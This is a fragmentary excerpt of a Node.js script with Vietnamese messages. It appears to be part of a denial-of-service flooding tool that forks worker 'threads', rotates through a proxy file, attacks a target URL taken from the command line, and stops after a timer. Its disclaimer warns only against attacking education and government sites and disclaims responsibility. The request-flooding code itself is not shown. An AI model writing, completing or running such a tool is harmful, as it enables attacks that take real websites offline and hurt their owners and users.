...
const coloredString = "Không Tấn Công Website : edu , gov , chinhphu . Nếu Tấn Công chúng tôi sẽ không chịu trách nhiệm.".white;
   for (let counter = 1; counter <= args.threads; counter++) {
   console.clear()
 ...
 console.log(`ProxyFile: ${args.proxyFile} | Tổng: ${proxies.length}`);
 console.log("Lưu Ý: ".brightCyan + coloredString);
       cluster.fork();
    }
...
const StopScript = () => setTimeout(function () {
    const message = `Đã Tạm Dừng Tấn Công ${process.argv[2]}`;
    const border = '='.repeat(message.length + 6);
    
    // Tính toán padding để căn giữa nội dung
    const padding = ' '.repeat(Math.max(0, (process.stdout.columns - (message.length + 6)) / 2));

    // Hiển thị nội dung ra console
    console.log(`\n${padding}${border}`);
    console.log(`${padding}   ${message}   `);
    console.log(`${padding}${border}\n`);

    process.exit();
}, args.time * 1000);

// Đảm bảo rằng 'args.time' đã được định nghĩa trước đó
